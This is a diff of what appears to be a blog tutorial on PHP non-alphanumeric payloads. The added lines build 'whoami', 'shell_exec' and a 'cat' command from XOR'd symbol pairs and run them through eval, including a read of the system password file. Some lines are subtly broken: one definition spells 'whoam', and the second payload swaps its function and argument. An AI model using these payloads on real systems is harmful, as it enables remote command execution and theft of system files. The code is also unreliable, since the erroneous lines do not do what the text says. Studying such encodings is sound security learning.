@@ -72,13 +72,20 @@ echo $\_\_($\_);  it actually same as echo shell\_exec('whoami'). <br>
 
 Hands-on time!!! , below code is vulnerable to php-nonalpha encoder,which limit us only to write number and some symbols. <br>
 ![Image 13](/images/PHP_Non-Alpha/Selection_012.png)<br><br>
-With same payload we craft before.Try to exploit eval function by define $\_ = 'whoami'; $\_\_ = shell\_exec() .<br>
-eval('print '.($\_ = define\_whoami).($\_\_= define\_shell\_exec).($\_\_($\_)).";"); <br>
+With same payload we craft before.Try to exploit eval function.<br>
+($\_ = ('7'^'@').('7'^'_').('/'^'@').(':'^'[').('@'^'-') is define for whoami <br>
+($\_\_= ('3'^'@').('3'^'[').('8'^']').(','^'@').('@'^',')."\_".('['^'>').(']'^'%').('^'^';').('^'^'=') is define for shell_exec<br>
+($\_\_($\_)) is equal to shell_exec('whoami')<br><br>
+eval('print '.($\_ = ('7'^'@').('7'^'_').('/'^'@').(':'^'[').('@'^'-').('['^'2')).($\_\_= ('3'^'@').('3'^'[').('8'^']').(','^'@').('@'^',')."\_".('['^'>').(']'^'%').('^'^';').('^'^'=')).($\_\_($\_)).";"); <br>
 I bracket for each variables define and execute it by calling ($\_\_($\_)) <br>
 ![Image 14](/images/PHP_Non-Alpha/Selection_013.png)<br><br>
 ![Image 14](/images/PHP_Non-Alpha/Selection_014.png)<br><br>
 
+
 try with other payload 'cat /etc/password' and arrange our payload back. <br>
+
+($\_ = ('7'^'@').('7'^'\_').('/'^'@').(':'^'[').('@'^'-').('['^'2')).($\_\_= ('8'^'[').('!'^'@').(')'^']').('['^'{')."/".(']'^'8').(']'^')').(']'^'>')."/".('^'^'.').('^'^'?').('_'^',').('3'^'@').('7'^'@').('9'^']')).($\_\_($\_)) <br>
+
 ![Image 14](/images/PHP_Non-Alpha/Selection_015.png)<br><br>
 ![Image 14](/images/PHP_Non-Alpha/Selection_016.png)<br><br>
 
